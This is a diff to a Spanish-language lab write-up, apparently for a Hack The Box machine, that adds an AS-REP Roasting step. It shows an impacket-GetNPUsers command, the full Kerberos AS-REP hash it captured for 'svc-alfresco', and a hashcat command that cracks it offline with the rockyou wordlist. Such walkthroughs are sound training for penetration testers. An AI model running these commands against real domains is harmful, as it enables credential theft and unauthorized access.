@@ -87,3 +87,16 @@ Una vez tenemos un listado potencial de usuarios validos un ataque que podemos p
 ## AS-REPRoast Atack
 
 Lo primero que tenemos que hacer con nuestra lista de usuarios validos es intentar obtener los tickets TGT de los usuarios
+```shell
+impacket-GetNPUsers htb.local/ -no-pass -usersfile users
+```
+
+EN la salida del comando encontramos un usuario llamado `svc-alfresco` y nos muestra el hash
+```shell
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:8ee1c1939ffae15b70dbf66f62cd0cfc$7072245f11232b034f664a22c3ebbe5d6ccddd46314b1130679427ffe1ea9d9901df95f74defb860a006bd1cabb2544bc42c99473dc50e275cf47964d5ce2c8daf117a70ccde2767b450b6053db844b4acf262c5eedee6caeec3cd58abd76f8bf3da3813678dbb3749aa4852d30878a8d47aa92b268876477f1cced63fcdb3ceb091d98a00cb83f65284d85a743113ac91b0bbf90e5103cf347a9e15e6202e5ae9b0059215a823e1496e375577edca141c172b2800c3ec63dfb2bce47c6eef4e7c0fedfd3658d42b172c26b4d3ae745b610b263f586fbd300dd47cf5dd2397cf9b2abc2ab015
+```
+
+Con el hash optenido lo tendremos que crackear usando fuerza bruta
+```shell
+hashcat hash /usr/share/wordlists/rockyou.txt
+```
